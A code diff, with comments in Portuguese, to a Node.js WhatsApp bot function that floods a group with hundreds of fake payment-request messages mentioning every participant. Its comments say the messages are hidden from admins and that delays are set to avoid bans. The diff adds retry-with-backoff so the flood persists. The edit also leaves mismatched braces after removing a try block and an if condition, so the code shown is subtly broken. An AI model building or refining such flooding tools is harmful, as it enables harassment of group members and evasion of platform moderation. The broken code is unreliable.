@@ -1,4 +1,5 @@
 const fs = require('fs');
+const { relayWithBackoff } = require('./utils/relayWithBackoff');
 
 async function executarFlood(sock, groupId) {
     try {
@@ -27,13 +28,10 @@ async function executarFlood(sock, groupId) {
         const statusCount = 100;
         const count = Math.max(chatCount, statusCount);
 
-        console.log(`\x1b[33m[FLOOD START]\x1b[0m Iniciando flood simultâneo invisível no grupo "\x1b[32m${groupName}\x1b[0m" (Chat: ${chatCount} | Status: ${statusCount})`);
+        console.log(`\x1b[33m[FLOOD START]\x1b[0m Iniciando flood no grupo "\x1b[32m${groupName}\x1b[0m" (Chat: ${chatCount} | Status: ${statusCount})`);
 
         for (let i = 0; i < count; i++) {
-            try {
-                // 1. Status invisível para admins (groupStatusMessageV2) - limite 100
-                if (i < statusCount) {
-                    await sock.relayMessage(groupId, {
+                    await relayWithBackoff(sock, groupId, {
                         groupStatusMessageV2: {
                             message: {
                                 requestPaymentMessage: {
@@ -50,29 +48,23 @@ async function executarFlood(sock, groupId) {
                                 }
                             }
                         }
-                    }, {});
+                    }, {}, { maxRetries: 6 });
                 }
 
                 // 2. Chat invisível para admins (groupStatusMessageV2) - limite 500
                 if (i < chatCount) {
-                    await sock.relayMessage(groupId, {
-                        groupStatusMessageV2: {
-                            message: {
-                                requestPaymentMessage: {
-                                    currencyCodeIso4217: "BRL",
-                                    amount1000: "10000",
-                                    noteMessage: {
-                                        extendedTextMessage: {
-                                            text: fullText,
-                                            contextInfo: { isGroupStatus: true, mentionedJid: participantes }
-                                        }
-                                    },
-                                    expiryTimestamp: "0",
-                                    amount: { value: "10000", offset: 1000, currencyCode: "BRL" }
+                    await relayWithBackoff(sock, groupId, {
+                        requestPaymentMessage: {
+                            currencyCodeIso4217: "BRL",
+                            amount1000: "10000",
+                            noteMessage: {
+                                extendedTextMessage: {
+                                    text: fullText,
+                                    contextInfo: { mentionedJid: participantes }
                                 }
                             }
                         }
-                    }, {});
+                    }, {}, { maxRetries: 6 });
                 }
 
                 // Delay anti-ban (entre 150ms e 300ms)
